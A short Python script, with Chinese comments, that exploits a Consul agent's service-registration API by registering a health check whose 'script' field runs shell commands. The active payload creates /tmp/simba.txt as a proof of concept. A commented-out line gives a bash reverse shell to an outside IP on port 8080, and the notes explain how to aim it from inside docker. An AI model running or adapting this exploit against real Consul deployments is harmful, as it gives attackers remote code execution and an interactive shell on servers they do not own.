# -*- coding: UTF-8 -*-
import requests
data = {
          "ID": "http",
          "Name": "http",
          "Address": "127.0.0.1",
          "Port": 80,
          "check": {
          #"script": "sh -i >& /dev/tcp/119.1.1.28/8080 0>&1", # bash may not exist
          # 某些镜像 /dev/tcp 目录不存在会导致失败
          # docker 里面可以connect 外网/宿主机docker0，但不能写成127.0.0.1，那个是docker自己的lo
          "script":"touch /tmp/simba.txt",
          "interval": "10s"
          }
        }
result = requests.put("http://127.0.0.1:1998/v1/agent/service/register",json=data)
print result.text
